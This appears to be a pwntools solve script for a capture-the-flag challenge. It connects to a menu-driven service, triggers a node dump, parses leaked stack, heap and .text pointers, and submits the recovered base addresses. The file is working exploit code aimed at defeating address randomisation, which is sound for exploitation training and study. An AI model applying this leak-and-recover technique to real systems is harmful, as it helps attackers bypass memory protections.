#!/usr/bin/env python3

import re
import sys

import pwn


def usage() -> int:
    print(f"usage: {sys.argv[0]} HOST PORT")
    return 2


def main() -> int:
    pwn.context.log_level = "error"

    if len(sys.argv) != 3:
        return usage()

    host = sys.argv[1]
    port = int(sys.argv[2])

    io = pwn.remote(host, port)

    # create
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"key length")
    io.sendline(b"16")
    io.recvuntil(b"data length")
    io.sendline(b"16")
    io.recvuntil(b"crypto")
    io.sendline(b"1")
    io.recvuntil(b"key bytes")
    io.sendline(b"K" * 16)
    io.recvuntil(b"data bytes")
    io.sendline(b"A" * 16)

    # print
    io.recvuntil(b"> ")
    io.sendline(b"3")
    io.recvuntil(b"index")
    io.sendline(b"0")

    dump = io.recvuntil(b"> ", drop=False)

    m_stack = re.search(rb"Node list @ (0x[0-9a-fA-F]+)", dump)
    m_exec = re.search(rb"Execution ID: (-?[0-9]+)", dump)
    m_heap = re.search(rb"node @ (0x[0-9a-fA-F]+)", dump)
    m_text = re.search(rb"crypt ptr value = (0x[0-9a-fA-F]+)", dump)
    if not (m_stack and m_exec and m_heap and m_text):
        sys.stdout.buffer.write(dump)
        raise SystemExit("failed to parse leaks")

    leak_stack = int(m_stack.group(1), 16)
    execution_id = int(m_exec.group(1))
    leak_heap = int(m_heap.group(1), 16)
    leak_text = int(m_text.group(1), 16)

    # Stack base: use Execution ID (maps-stack-base minus leaked stack slot pointer)
    g_stack = leak_stack + execution_id

    # Heap/Text bases: page-align by zeroing last 3 hex digits (0x1000 alignment)
    g_heap = leak_heap & ~0xFFF
    g_text = leak_text & ~0xFFF

    # quit + submit bases
    io.sendline(b"4")
    io.recvuntil(b"beginning of stack")
    io.sendline(hex(g_stack).encode())
    io.recvuntil(b"beginning of heap")
    io.sendline(hex(g_heap).encode())
    io.recvuntil(b"beginning of .text")
    io.sendline(hex(g_text).encode())

    out = io.recvall(timeout=2)
    sys.stdout.buffer.write(out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

